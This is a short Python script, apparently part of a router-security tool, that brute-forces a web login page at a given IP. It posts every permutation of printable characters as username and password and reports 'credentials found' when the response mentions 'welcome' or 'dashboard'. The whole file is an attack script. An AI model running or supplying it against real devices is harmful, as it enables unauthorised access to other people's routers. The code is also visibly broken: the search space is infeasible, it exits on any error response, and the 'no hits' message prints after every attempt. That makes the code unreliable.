"""
Explain vulnerability
"""

from argparse import ArgumentParser
from itertools import permutations
from string import printable

from requests import RequestException, post


def check_for_cred(ip: str):
    """
    #Tries to brute force credentials
    """
    print("# Brute forcing for credentials...")

    no_hits = True
    MIN_LEN = 6
    MAX_LEN = 10
    for i in range(MIN_LEN, MAX_LEN + 1):
        for user_perm in permutations(printable, i):
            for pass_perm in permutations(printable, i):
                user_perm = "".join(user_perm)
                pass_perm = "".join(pass_perm)
                try:
                    res = post(
                        f"http://{ip}/login",
                        data={"username": user_perm, "password": pass_perm},
                        timeout=5,
                    )
                    if not res:
                        return

                    # Somtimes routers display "Welcome, Admin". Reason behind welcome
                    if "welcome" in res.text.lower():
                        print(f"- *Credential found!: {user_perm}:{pass_perm}*")
                        no_hits = False

                    # Checks for status code 200
                    elif res.status_code == 200 and "dashboard" in res.text.lower():
                        print(f"- *Credential found!: {user_perm}:{pass_perm}*")
                        no_hits = False

                except RequestException:
                    continue

                if no_hits:
                    print("- No hits when brute forcing credentials")
                print()


if __name__ == "__main__":
    parser = ArgumentParser(prog="brute_force_creds")
    parser.add_argument("-ip", action="store", type=str)
    args = parser.parse_args()
    check_for_cred(args.ip)
